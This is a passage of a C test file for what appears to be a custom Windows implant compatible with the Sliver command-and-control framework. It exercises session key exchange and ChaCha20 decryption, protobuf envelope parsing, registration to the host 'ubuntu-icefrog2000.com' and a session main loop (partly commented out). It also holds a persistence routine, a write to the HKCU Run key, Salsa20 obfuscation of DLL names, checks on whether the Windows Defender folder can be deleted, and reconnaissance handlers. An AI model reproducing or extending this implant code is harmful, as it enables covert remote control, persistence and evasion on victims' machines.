	BYTE PubKey[] = { 69, 146, 99, 138, 2, 14, 15, 228, 78, 68, 167, 140, 48, 156, 176, 251, 151, 23, 140, 102, 254, 76, 161, 227, 126, 46, 203, 163, 199, 22, 37, 42 };
	BYTE Signature[] = { 112, 170, 174, 238, 194, 80, 174, 195, 105, 64, 246, 2, 239, 184, 35, 205, 42, 85, 150, 16, 225, 147, 228, 17, 249, 8, 118, 174, 211, 177, 206, 159, 245, 113, 219, 53, 45, 186, 203, 94, 182, 76, 5, 77, 176, 249, 35, 22, 67, 237, 95, 71, 186, 35, 204, 13, 153, 248, 66, 4, 39, 6, 162, 3 };
	HMODULE hMod = NULL;
	ED25519_VERIFY ed25519_verify = NULL;

	if (!ED25519Verify(Signature, Msg, _countof(Msg), PubKey)) {
		PrintFormatA("FALSE\n");
	}
	else {
		PrintFormatA("TRUE\n");
	}
}

void test44(void) {
	BYTE Msg[] = { 218, 1, 175, 173, 130, 127, 18, 224, 155, 253, 10, 118, 58, 148, 82, 75, 107, 121, 234, 27, 1, 162, 86, 123, 42, 86, 137, 119, 235, 218, 226, 89, 159, 36, 134, 161, 199, 18, 63, 48, 84, 251, 126, 144, 111, 105, 252, 50, 71, 3, 180, 224, 167, 23, 175, 99, 229, 48, 200, 185, 145, 130, 91, 25, 33, 98, 52, 247, 201, 120, 221, 199, 41, 247, 222, 191, 90, 65, 87, 50, 18, 145, 56, 106, 208, 228 };
	BYTE PubKey[] = { 69, 146, 99, 138, 2, 14, 15, 228, 78, 68, 167, 140, 48, 156, 176, 251, 151, 23, 140, 102, 254, 76, 161, 227, 126, 46, 203, 163, 199, 22, 37, 42 };
	BYTE Signature[] = { 112, 170, 174, 238, 194, 80, 174, 195, 105, 64, 246, 2, 239, 184, 35, 205, 42, 85, 150, 16, 225, 147, 228, 17, 249, 8, 118, 174, 211, 177, 206, 159, 245, 113, 219, 53, 45, 186, 203, 94, 182, 76, 5, 77, 176, 249, 35, 22, 67, 237, 95, 71, 186, 35, 204, 13, 153, 248, 66, 4, 39, 6, 162, 3 };
	HMODULE hMod = NULL;
	ED25519_VERIFY ed25519_verify = NULL;

	hMod = LoadLibraryA("ed25519_64.dll");
	ed25519_verify = (ED25519_VERIFY)GetProcAddress(hMod, "ed25519_verify");
	if (!ed25519_verify(Signature, Msg, _countof(Msg), PubKey)) {
		PrintFormatA("FALSE\n");
	}
	else {
		PrintFormatA("TRUE\n");
	}
}

void test45(void) {
	//BYTE pSessionKey[] = { 27, 77, 147, 18, 250, 64, 204, 175, 58, 32, 210, 175, 62, 24, 182, 214, 170, 115, 195, 221, 244, 178, 189, 132, 38, 103, 156, 124, 12, 1, 2, 19 };
	//PSLIVER_HTTP_CLIENT pClient = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
	//BYTE Msg[] = { 69, 100, 209, 158, 5, 31, 113, 166, 249, 84, 225, 239, 116, 125, 149, 140, 204, 119, 2, 31, 96, 107, 139, 28, 67, 159, 249, 103, 138, 114, 123, 126, 11, 155, 121, 78, 161, 59, 206, 84, 190, 180, 194, 199, 15, 91, 104, 221, 196, 235, 203, 151, 198, 99, 144, 167, 156, 84, 51, 111, 141, 53, 151, 249, 190, 17, 155, 127, 154, 28, 236, 178, 59, 12, 229, 21, 226, 234, 18, 14, 165, 8, 26, 86, 32, 236, 76, 24, 218, 159, 240, 218, 61, 237, 211, 254, 101, 39, 216, 59, 150, 27, 234, 36, 1, 61, 128, 112, 38, 232, 135, 122, 195, 208, 28, 127, 246, 139, 135, 71, 3, 162, 178, 253, 172, 161, 43, 77, 239, 188, 217, 1, 3, 180 };
	//CHAR szServerMinisignPubKey[] = "untrusted comment: minisign public key: 54F9A6711F059ED1\nRWTRngUfcab5VNJWy1PKeUHScRTf/GBnzp9c7ynZTuJcDybb2HgHwfN/";

	///*serverPublicKey: { [69 100] [53 145 169 236 40 159 114 61] [223 82 193 19 96 27 37 74 25 127 205 185 41 138 222 170 251 236 164 190 112 186 20 219 150 85 70 183 126 65 193 132] }
	//c.Key: [53 147 30 66 50 102 161 188 109 18 221 32 152 70 196 146 239 155 227 74 90 234 40 216 69 217 32 221 40 121 249 32]
	//plaintext: [51 51 48 98 55 50 102 53 56 55 54 99 50 55 52 56 99 48 52 51 51 97 54 54 52 51 53 102 53 101 48 53]*/
	//PBYTE pPlainText = NULL;
	//DWORD cbPlainText = 0;

	//pClient->pSessionKey = pSessionKey;
	//pClient->lpServerMinisignPublicKey = szServerMinisignPubKey;
	//pPlainText = SessionDecrypt(pClient, Msg, _countof(Msg), &cbPlainText);
	//HexDump(pPlainText, cbPlainText);
	//FREE(pClient);
}

void test46(void) {
	BYTE CipherText[] = { 166, 79, 199, 13, 85, 218, 251, 232, 139, 101, 168, 155, 94, 25, 228, 162, 11, 94, 32, 191, 233, 46, 57, 97, 121, 197, 154, 137, 5, 34, 76, 247, 150, 52, 58, 39, 239, 16, 60, 116, 166, 48, 14, 174, 8, 51, 158, 228, 88, 229, 61, 76, 203, 243, 127, 192, 97, 237, 232, 91, 29, 13, 168, 63, 8, 166, 180, 218, 130, 83, 246, 108, 153, 165, 8, 228, 41, 110, 24, 255, 201, 79 };
	BYTE Key[] = { 231, 121, 89, 214, 23, 251, 49, 23, 236, 76, 192, 5, 20, 135, 151, 126, 176, 103, 181, 0, 131, 195, 5, 20, 64, 243, 54, 65, 45, 46, 151, 150 };
	BYTE Nonce[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
	PBUFFER pPlainText = NULL;

	pPlainText = Chacha20Poly1305DecryptAndVerify(Key, Nonce, CipherText, _countof(CipherText), NULL, 0);
	HexDump(pPlainText->pBuffer, pPlainText->cbBuffer);
	FreeBuffer(pPlainText);
}

void test47(void) {
	/*WCHAR wszCommandLine[] = L"C:\\Windows\\System32\\cmd.exe";

	PersistenceMethod1(wszCommandLine);*/
}

void test48(void) {
	
}

void test49(void) {
	LPWSTR lpProxyUrl = NULL;

	if (!WinHttpDetectAutoProxyConfigUrl(WINHTTP_AUTO_DETECT_TYPE_DNS_A, &lpProxyUrl)) {
		LOG_ERROR("WinHttpDetectAutoProxyConfigUrl", GetLastError());
		return;
	}

	PrintFormatW(L"lpProxyUrl: %s", lpProxyUrl);
	GlobalFree(lpProxyUrl);
}

void test50(void) {
	WINHTTP_PROXY_INFO ProxyDefault;

	SecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
	if (!WinHttpGetDefaultProxyConfiguration(&ProxyDefault)) {
		LOG_ERROR("WinHttpGetDefaultProxyConfiguration", GetLastError());
		return;
	}

	PrintFormatW(L"lpszProxy: %s\n", ProxyDefault.lpszProxy);
	PrintFormatW(L"lpszProxyBypass: %s", ProxyDefault.lpszProxyBypass);
}

void test51(void) {
	/*PSLIVER_HTTP_CLIENT pHttpClient = NULL;
	pHttpClient = SliverSessionInit("https://ubuntu-icefrog2000.com");
	if (pHttpClient == NULL) {
		return;
	}

	PrintFormatA("SessionID: %s\n", pHttpClient->szSessionID);
	FreeSliverHttpClient(pHttpClient);*/
}

void test52(void) {
	/*BYTE SessionKey[] = { 0x95, 0x7d, 0x45, 0x5f, 0x5c, 0xed, 0x74, 0xdf, 0x8, 0xcf, 0x10, 0x15, 0xa1, 0xb1, 0x73, 0x8b, 0x45, 0xac, 0x74, 0x57, 0x71, 0x48, 0x36, 0x4d, 0xe8, 0x49, 0xad, 0x2f, 0x18, 0x4f, 0xce, 0x11 };
	BYTE Nonce[] = { 0x4f, 0x6a, 0xa6, 0x7e, 0x22, 0x82, 0x3a, 0x63, 0xa1, 0x78, 0xae, 0xe0 };
	BYTE CipherText[] = { 0xdd, 0xe5, 0xfc, 0x4c, 0xb2, 0x28, 0xe, 0xff, 0x2, 0x2b, 0x8f, 0x56, 0xaf, 0x35, 0x43, 0x4a, 0xde, 0x98, 0x3f, 0xd1, 0xb5, 0x84, 0x77, 0xa3, 0x9e, 0x52, 0xfc, 0x7d, 0xa2, 0x44, 0xaa, 0x92, 0x82, 0x85, 0xc2, 0xdd, 0x43, 0x83, 0x37, 0x18, 0xf0, 0xb, 0x2e, 0x6b, 0x6b, 0xdc, 0xbc, 0x53 };*/

	// -----------------------
	BYTE SessionKey[] = { 234, 74, 74, 12, 251, 78, 117, 118, 101, 175, 24, 153, 110, 240, 212, 227, 20, 58, 122, 50, 237, 29, 139, 36, 229, 101, 166, 47, 159, 185, 133, 45 };
	BYTE Nonce[] = { 189, 147, 30, 168, 197, 184, 111, 176, 175, 40, 81, 247 };
	BYTE CipherText[] = { 186, 46, 74, 199, 245, 172, 132, 246, 179, 28, 129, 194, 96, 41, 128, 21, 103, 222, 254, 242, 234, 89, 148, 174, 81, 127, 131, 87, 214, 0, 34, 133, 214, 3, 44, 119, 121, 179, 62, 156, 37, 83, 92, 90, 221, 127, 138, 174 };

	DWORD cbPlainText = 0;
	PBUFFER pPlainText = NULL;

	pPlainText = Chacha20Poly1305DecryptAndVerify(SessionKey, Nonce, CipherText, _countof(CipherText), NULL, 0);
	if (pPlainText == NULL || cbPlainText == 0) {
		PrintFormatW(L"Chacha20Poly1305DecryptAndVerify failed.\n");
		return;
	}

	HexDump(pPlainText, cbPlainText);
	FreeBuffer(pPlainText);
}

void test53(void) {
	LPSTR lpSid = NULL;

	lpSid = GetCurrentUserSID();
	if (lpSid == NULL) {
		return;
	}

	PrintFormatA("lpSid: %s\n", lpSid);
	FREE(lpSid);
}

void test54(void) {
	LPSTR lpSid = NULL;

	lpSid = GetCurrentProcessUserSID();
	if (lpSid == NULL) {
		return;
	}

	PrintFormatA("lpSid: %s\n", lpSid);
	FREE(lpSid);

	lpSid = GetCurrentProcessGroupSID();
	if (lpSid == NULL) {
		return;
	}

	PrintFormatA("lpSid: %s\n", lpSid);
	FREE(lpSid);
}

void test55(void) {
	/*CHAR szHostName[0x100];

	WSAStartup();
	SecureZeroMemory(szHostName, sizeof(szHostName));
	gethostname(szHostName, 0x100);
	PrintFormatA("%s\n", szHostName);*/
}

void test56(void) {
	PBYTE pOutput = NULL;
	DWORD cbOutput = 0;

	pOutput = MarshalVarInt(60000000000, &cbOutput);
	HexDump(pOutput, cbOutput);
}

void test57(void) {
	/*PSLIVER_HTTP_CLIENT pSliverClient = NULL;
	PBYTE pOutput = NULL;
	DWORD cbOutput = 0;

	pSliverClient = SliverHttpClientInit("https://ubuntu-icefrog2000.com");
	pOutput = RegisterSliver(pSliverClient, &cbOutput);
	HexDump(pOutput, cbOutput);
	FREE(pOutput);
	FreeSliverHttpClient(pSliverClient);*/
}

void test58(void) {
	BYTE MarshaledData[] = { 10, 5, 1, 2, 3, 4, 5, 18, 147, 2, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 24, 188, 181, 226, 179, 197, 198, 4, 32, 1, 48, 213, 204, 221, 195, 8, 58, 11, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 58, 11, 84, 114, 97, 110, 103, 32, 78, 104, 117, 110, 103, 58, 10, 78, 103, 111, 99, 32, 72, 117, 121, 101, 110, 66, 25, 10, 10, 72, 97, 110, 103, 32, 84, 114, 97, 110, 103, 10, 11, 84, 114, 97, 110, 32, 80, 104, 117, 111, 110, 103, 74, 10, 0, 7, 8, 9, 153, 239, 213, 154, 147, 2 };
	PPBElement ElementList[9];
	DWORD i = 0;
	LPVOID* pResult = NULL;

	for (i = 0; i < _countof(ElementList); i++) {
		ElementList[i] = ALLOC(sizeof(PBElement));
		ElementList[i]->dwFieldIdx = i + 1;
	}

	ElementList[0]->Type = Bytes;
	ElementList[1]->Type = Bytes;
	ElementList[2]->Type = Varint;
	ElementList[3]->Type = Varint;
	FREE(ElementList[4]);
	ElementList[4] = NULL;
	ElementList[5]->Type = Varint;
	ElementList[6]->Type = RepeatedBytes;
	ElementList[7]->Type = StructType;
	ElementList[8]->Type = RepeatedVarint;

	ElementList[7]->SubElements = ALLOC(sizeof(PPBElement));
	ElementList[7]->SubElements[0] = ALLOC(sizeof(PBElement));
	ElementList[7]->SubElements[0]->Type = RepeatedBytes;
	ElementList[7]->SubElements[0]->dwFieldIdx = 1;
	ElementList[7]->dwNumberOfSubElement = 1;
	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshaledData, sizeof(MarshaledData), NULL);
}

void test59(void) {
	BYTE MarshaledData[] = { 8, 128, 133, 255, 240, 159, 161, 182, 185, 245, 1, 16, 11, 26, 51, 10, 2, 67, 58, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 48, 48, 50, 100, 56, 102, 54, 97, 45, 100, 98, 51, 55, 45, 52, 99, 97, 50, 45, 98, 102, 101, 57, 45, 55, 98, 56, 101, 50, 97, 55, 100, 102, 49, 98, 102 };
	PPBElement ElementList[4];
	DWORD i = 0;
	PENVELOPE pResult = NULL;

	for (i = 0; i < _countof(ElementList); i++) {
		ElementList[i] = ALLOC(sizeof(PBElement));
		ElementList[i]->dwFieldIdx = i + 1;
	}

	ElementList[0]->Type = Varint;
	ElementList[1]->Type = Varint;
	ElementList[2]->Type = Bytes;
	ElementList[3]->Type = Varint;
	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshaledData, sizeof(MarshaledData), NULL);
	PrintFormatA("pResult->uID: 0x%08llx\n", pResult->uID);
	PrintFormatA("pResult->uType: 0x%08llx\n", pResult->uType);
	HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
	PrintFormatA("pResult->UnknownMessageType: 0x%08llx", pResult->uUnknownMessageType);
}

void test60(void) {
	BYTE MarshaledData[] = { 10, 2, 67, 58, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 101, 101, 102, 54, 100, 48, 52, 54, 45, 53, 97, 49, 99, 45, 52, 53, 99, 51, 45, 98, 52, 99, 53, 45, 97, 51, 55, 100, 50, 98, 49, 55, 97, 57, 54, 56 };
	PPBElement ElementList[2];
	DWORD i = 0;
	PBYTE pResult = NULL;

	for (i = 0; i < _countof(ElementList); i++) {
		ElementList[i] = ALLOC(sizeof(PBElement));
	}

	ElementList[0]->dwFieldIdx = 1;
	ElementList[0]->Type = Bytes;
	ElementList[1]->dwFieldIdx = 9;
	ElementList[1]->Type = StructType;
	ElementList[1]->dwNumberOfSubElement = 4;
	ElementList[1]->SubElements = ALLOC(sizeof(PPBElement) * ElementList[1]->dwNumberOfSubElement);
	for (i = 0; i < ElementList[1]->dwNumberOfSubElement; i++) {
		ElementList[1]->SubElements[i] = ALLOC(sizeof(PBElement));
		ElementList[1]->SubElements[i]->dwFieldIdx = i + 1;
	}

	ElementList[1]->SubElements[2]->dwFieldIdx = 8;
	ElementList[1]->SubElements[3]->dwFieldIdx = 9;

	ElementList[1]->SubElements[0]->Type = Varint;
	ElementList[1]->SubElements[1]->Type = Varint;
	ElementList[1]->SubElements[2]->Type = Bytes;
	ElementList[1]->SubElements[3]->Type = Bytes;

	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshaledData, sizeof(MarshaledData), NULL);
}

void test61(void) {
	PrintFormatA("%d\n", RtlGetCurrentProcessorNumber());
}

void test62(void) {
	/*PSLIVER_HTTP_CLIENT pSliverClient = NULL;
	PBYTE pMarshaledRegisterInfo = NULL;
	DWORD cbMarshaledRegisterInfo = 0;
	PENVELOPE pRegisterEnvelope = NULL;

	pSliverClient = SliverSessionInit("http://ubuntu-icefrog2000.com");
	if (pSliverClient == NULL) {
		LogError(L"%s.%d: SliverHttpClientInit failed at %s\n", __FILE__, __LINE__, __FUNCTIONW__);
		goto CLEANUP;
	}

	PrintFormatA("pSliverClient->szSessionID: %s\n", pSliverClient->szSessionID);
	pSliverClient->HttpConfig.AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pSliverClient->szSessionID) + lstrlenA(pSliverClient->lpCookiePrefix) + 1);
	wsprintfA(pSliverClient->HttpConfig.AdditionalHeaders[Cookie], "%s=%s", pSliverClient->lpCookiePrefix, pSliverClient->szSessionID);
	pMarshaledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshaledRegisterInfo);
	if (pMarshaledRegisterInfo == NULL) {
		LogError(L"%s.%d: RegisterSliver failed at %s\n", __FILE__, __LINE__, __FUNCTIONW__);
		goto CLEANUP;
	}

	pRegisterEnvelope = ALLOC(sizeof(ENVELOPE));
	pRegisterEnvelope->uType = MsgRegister;
	pRegisterEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRegisterEnvelope->pData->pBuffer = pMarshaledRegisterInfo;
	pRegisterEnvelope->pData->cbBuffer = cbMarshaledRegisterInfo;
	WriteEnvelope(pSliverClient, pRegisterEnvelope);
	SessionMainLoop(pSliverClient);
CLEANUP:
	FreeEnvelope(pRegisterEnvelope);
	FreeSliverHttpClient(pSliverClient);
	return;*/
}

void test63
(
	_Inout_ PTP_CALLBACK_INSTANCE Instance,
	_Inout_opt_ PVOID Context,
	_Inout_ PTP_WORK Work
)
{
	PrintFormatW(L"Main handler\n");
}

void test64(void) {
	PSLIVER_THREADPOOL pSliverPool = InitializeSliverThreadPool();
	PTP_WORK pWork = NULL;
	DWORD i = 0;

	if (pSliverPool == NULL) {
		goto CLEANUP;
	}

	while (TRUE) {
		pWork = CreateThreadpoolWork(test63, NULL, &pSliverPool->CallBackEnviron);
		if (pWork == NULL) {
			goto CLEANUP;
		}

		TpPostWork(pWork);
		i++;
		if (i == 5) {
			break;
		}

		Sleep(2000);
	}

CLEANUP:
	FreeSliverThreadPool(pSliverPool);
	return;
}

void test65(void) {
	CHAR szBuffer[] = "C:\\Users";
	LPSTR lpRespData = NULL;

	if (!SetCurrentDirectoryA(szBuffer)) {
		lpRespData = ALLOC(0x100);
		wsprintfA(lpRespData, "SetCurrentDirectoryA failed at %s (Error: 0x%08x)", __FUNCTION__, GetLastError());
	}
	else {
		lpRespData = ALLOC(MAX_PATH);
		GetCurrentDirectoryA(MAX_PATH, lpRespData);
	}

	PrintFormatA("lpRespData: %s\n", lpRespData);
	return;
}

void test66(void) {
	LPWSTR lpBuffer = NULL;

	lpBuffer = GetEnvironmentStringsW();
	FreeEnvironmentStringsW(lpBuffer);
}

void test67(void) {
	ENVELOPE Envelope;
	BYTE Buffer[] = { 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 99, 49, 51, 51, 98, 101, 53, 100, 45, 49, 48, 50, 100, 45, 52, 99, 56, 57, 45, 57, 51, 49, 100, 45, 51, 49, 53, 48, 97, 97, 53, 56, 53, 52, 55, 53 };
	PENVELOPE pResult = NULL;

	Envelope.pData = ALLOC(sizeof(BUFFER));
	Envelope.pData->pBuffer = Buffer;
	Envelope.pData->cbBuffer = sizeof(Buffer);
	pResult = GetEnvHandler(&Envelope);
	HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
	FreeEnvelope(pResult);
}

void test68(void) {
	RaiseException(EXCEPTION_BREAKPOINT, EXCEPTION_NONCONTINUABLE, 0, NULL);
}

void test69(void) {
	LPSTR lpBuffer = ALLOC(MAX_PATH);
	DWORD dwReturnedLength = 0;

	dwReturnedLength = GetCurrentDirectoryA(10, lpBuffer);
	HexDump(lpBuffer, MAX_PATH);
	PrintFormatW(L"dwReturnedLength: %d\n", dwReturnedLength);
	FREE(lpBuffer);
}

void test70(void) {
	DeletePath(L"C:\\Users\\Admin\\Desktop\\Test");
}

void test71(void) {
	MovePath(L"C:\\Users\\Admin\\Desktop\\Test", L"C:\\Users\\Admin\\Desktop\\Test2\\Test3");
}

void test72(void) {
	WCHAR wszPath[] = L"C:\\Program Files\\Windows Defender";

	BOOL Result = CanPathBeDeleted(wszPath);
	PrintFormatW(L"Result: %d\n", Result);
	Result = IsPathWritable(wszPath);
	PrintFormatW(L"Result: %d\n", Result);
	Result = IsPathReadable(wszPath);
	PrintFormatW(L"Result: %d\n", Result);
}

void test73(void) {
	LPSTR lpOutput = NULL;

	lpOutput = FormatErrorCode(5);
	PrintFormatA("Error: %s\n", lpOutput);
	FREE(lpOutput);
}

void test74(void) {
	IfconfigHandler(NULL);
}

void test75(void) {
	HANDLE hProcess = NULL;
	LPSTR lpOutput = NULL;

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, 13220);
	if (hProcess == NULL) {
		LOG_ERROR("OpenProcess", GetLastError());
		return;
	}

	lpOutput = DescribeProcessMitigation(hProcess);
	PrintFormatA("%s\n", lpOutput);
	CloseHandle(hProcess);
}

void test76(void) {
	DWORD cbVersionInfo = 0;
	WCHAR wszPath[] = L"C:\\Users\\Admin\\AppData\\Local\\Programs\\Zalo\\Zalo-24.8.5\\Zalo.exe";
	DWORD dwHandle = 0;
	PBYTE pVersionInfo = NULL;
	VS_FIXEDFILEINFO* FixedFileInfo = NULL;
	DWORD i = 0;
	LPSTR lpVersion = NULL;
	ULONG uLangCodePage = 0;
	LPSTR lpCompanyName = NULL;
	LPSTR lpFileDesc = NULL;
	LPSTR lpProductName = NULL;

	cbVersionInfo = GetFileVersionInfoSizeW(wszPath, &dwHandle);
	pVersionInfo = ALLOC(cbVersionInfo);
	if (!GetFileVersionInfoW(wszPath, 0, cbVersionInfo, pVersionInfo)) {
		LOG_ERROR("GetFileVersionInfoW", GetLastError());
		goto CLEANUP;
	}

	for (i = 0; i < cbVersionInfo; i += sizeof(DWORD)) {
		if (*(PDWORD)(pVersionInfo + i) == VS_FFI_SIGNATURE) {
			FixedFileInfo = (VS_FIXEDFILEINFO*)(pVersionInfo + i);
		}
	}

	if (FixedFileInfo == NULL) {
		goto CLEANUP;
	}

	lpVersion = ALLOC(0x20);
	wsprintfA(lpVersion, "%d.%d.%d.%d", HIWORD(FixedFileInfo->dwFileVersionMS), LOWORD(FixedFileInfo->dwFileVersionMS), HIWORD(FixedFileInfo->dwFileVersionLS), LOWORD(FixedFileInfo->dwFileVersionLS));
	uLangCodePage = GetFileVersionInfoLangCodePage(pVersionInfo);
	lpCompanyName = GetFileVersionInfoStringEx(pVersionInfo, uLangCodePage, L"CompanyName");
	lpFileDesc = GetFileVersionInfoStringEx(pVersionInfo, uLangCodePage, L"FileDescription");
	lpProductName = GetFileVersionInfoStringEx(pVersionInfo, uLangCodePage, L"ProductName");

	PrintFormatA("lpVersion: %s\n", lpVersion);
	PrintFormatA("lpCompanyName: %s\n", lpCompanyName);
	PrintFormatA("lpFileDesc: %s\n", lpFileDesc);
	PrintFormatA("lpProductName: %s\n", lpProductName);
CLEANUP:
	if (pVersionInfo != NULL) {
		FREE(pVersionInfo);
	}

	if (lpVersion != NULL) {
		FREE(lpVersion);
	}

	return;
}

void test77(void) {
	HANDLE hProc = NULL;
	LPSTR lpCommandLine = NULL;

	hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, 13276);
	if (hProc == NULL) {
		LOG_ERROR("OpenProcess", GetLastError());
		return;
	}

	lpCommandLine = GetProcessCommandLine(hProc);
	PrintFormatA("%s", lpCommandLine);
	CloseHandle(hProc);
	FREE(lpCommandLine);
}

void test78(void) {
	SHCreateDirectory(NULL, L"C:\\Users\\Admin\\Desktop\\Test1\\Test2");
}

void test79(void) {
	PNETWORK_CONNECTION pConnections = NULL;
	PNETWORK_CONNECTION pConnectionEnrty = NULL;
	DWORD dwNumberOfConnections = 0;
	DWORD i = 0;
	DWORD j = 0;
	CHAR szIPv4[17];
	ULONG uIpv4 = 0;

	pConnections = GetNetworkConnections(&dwNumberOfConnections);
	for (i = 0; i < dwNumberOfConnections; i++) {
		pConnectionEnrty = &pConnections[i];
		PrintFormatA("uProtocolType: %d\n", pConnectionEnrty->uProtocolType);
		PrintFormatA("Ipv4: ");
		uIpv4 = pConnectionEnrty->LocalEndpoint.Address.Ipv4;
		SecureZeroMemory(szIPv4, sizeof(szIPv4));
		for (j = 0; j < sizeof(ULONG); j++) {
			wsprintfA(&szIPv4[lstrlenA(szIPv4)], "%d.", ((uIpv4 >> (j * 4)) & 0xFF));
		}

		szIPv4[lstrlenA(szIPv4) - 1] = '\0';
		PrintFormatA("%s", szIPv4);
	}
}

void test80(void) {
	PENVELOPE pEnvelope = NULL;
	PENVELOPE pRespEnvelope = NULL;

	pEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope = PsHandler(pEnvelope);
	HexDump(pRespEnvelope->pData->pBuffer, pRespEnvelope->pData->cbBuffer);
	FreeEnvelope(pRespEnvelope);
}

void test81(void) {
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;

	Status = RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	PrintFormatA("0x%08x\n", Status);
	if (hKey != NULL) {
		RegCloseKey(hKey);
	}
}

void test82(void) {
#ifdef _FULL
	BYTE Data[] = { 10, 19, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 48, 52, 53, 53, 97, 56, 49, 102, 45, 101, 102, 102, 101, 45, 52, 56, 100, 97, 45, 57, 102, 99, 99, 45, 99, 51, 51, 102, 56, 97, 54, 52, 56, 100, 101, 97 };
	PENVELOPE pRespEnvelope = NULL;
	PENVELOPE pEnvelope = ALLOC(sizeof(ENVELOPE));
	pEnvelope->pData = ALLOC(sizeof(BUFFER));
	pEnvelope->pData->pBuffer = Data;
	pEnvelope->pData->cbBuffer = sizeof(Data);
	pRespEnvelope = IcaclsHandler(pEnvelope);
	FreeEnvelope(pRespEnvelope);
#endif
}
void test83(void) {
	LPSTR lpOwner = GetFileOwner(L"C:\\Users\\Admin\\Desktop");
	PrintFormatA("%s\n", lpOwner);
	FREE(lpOwner);
}

void test84(void) {
	WCHAR wszBuffer[] = L"Advapi32.dll\0";
	BYTE Key[] = { 0x5c, 0xf6, 0xee, 0x79, 0x2c, 0xdf, 0x5, 0xe1, 0xba, 0x2b, 0x63, 0x25, 0xc4, 0x1a, 0x5f, 0x10 };
	BYTE Nonce[] = { 0x31, 0x7a, 0xae, 0x7, 0x69, 0xad, 0xab, 0x88 };
	BYTE CipherText[] = { 89, 147, 123, 111, 191, 132, 39, 51, 116, 107, 229, 182, 166, 46, 35, 216, 155, 53, 135, 241, 203, 185, 201, 29, 108, 91, 127, 88 };
	salsa20_encrypt(Key, Nonce, wszBuffer, sizeof(wszBuffer));
	HexDump(wszBuffer, sizeof(wszBuffer));
	salsa20_encrypt(Key, Nonce, wszBuffer, sizeof(wszBuffer));
	HexDump(wszBuffer, sizeof(wszBuffer));
}

void test85(void) {
	LPWSTR lpPath = NULL;

	lpPath = GetTargetShortcutFile(L"C:\\Users\\Admin\\Desktop\\Apps\\AULA F75.lnk");
	PrintFormatW(L"lpPath: %s\n", lpPath);
	FREE(lpPath);
}

void test86(void) {
	LPWSTR lpPath = NULL;

	lpPath = GetSymbolLinkTargetPath(L"C:\\Users\\Admin\\Downloads\\Apps");
	PrintFormatW(L"lpPath: %s\n", lpPath);
	FREE(lpPath);
}

void test87(void) {
	DWORD dwFileAttribute = GetFileAttributesW(L"C:\\Users\\Admin\\Desktop\\Debug");
	if (dwFileAttribute & FILE_ATTRIBUTE_DIRECTORY) {
		PrintFormatW(L"Is Folder\n");
	}

	return;
}

void test88(void) {
	HMODULE hModule = NULL;

	hModule = LoadLibraryW(L"kernel32.dll");
	FARPROC lpProc = GetProcAddress(hModule, "HeapAlloc");
	PrintFormatW(L"hModule: %p, lpProc: %p\n", hModule, lpProc);
}

void test89(void) {
	WCHAR wszFullPath[MAX_PATH];
	LPWSTR lpFilePart = NULL;

	GetFullPathNameW(L"..\\..\\..\\Downloads", MAX_PATH, wszFullPath, NULL);
	PrintFormatW(L"wszFullPath: %s\n", wszFullPath);
}

void test90(void) {
	TIME_ZONE_INFORMATION TimeZone;
	CHAR szTimeZone[0x10];

	SecureZeroMemory(&TimeZone, sizeof(TimeZone));
	GetTimeZoneInformation(&TimeZone);
	PrintFormatW(L"Bias: %d\n", TimeZone.Bias);
	PrintFormatW(L"StandardBias: %d\n", TimeZone.StandardBias);
	PrintFormatW(L"StandardName: %s\n", TimeZone.StandardName);
	PrintFormatW(L"DaylightName: %s\n", TimeZone.DaylightName);
	PrintFormatW(L"DaylightBias: %d\n", TimeZone.DaylightBias);
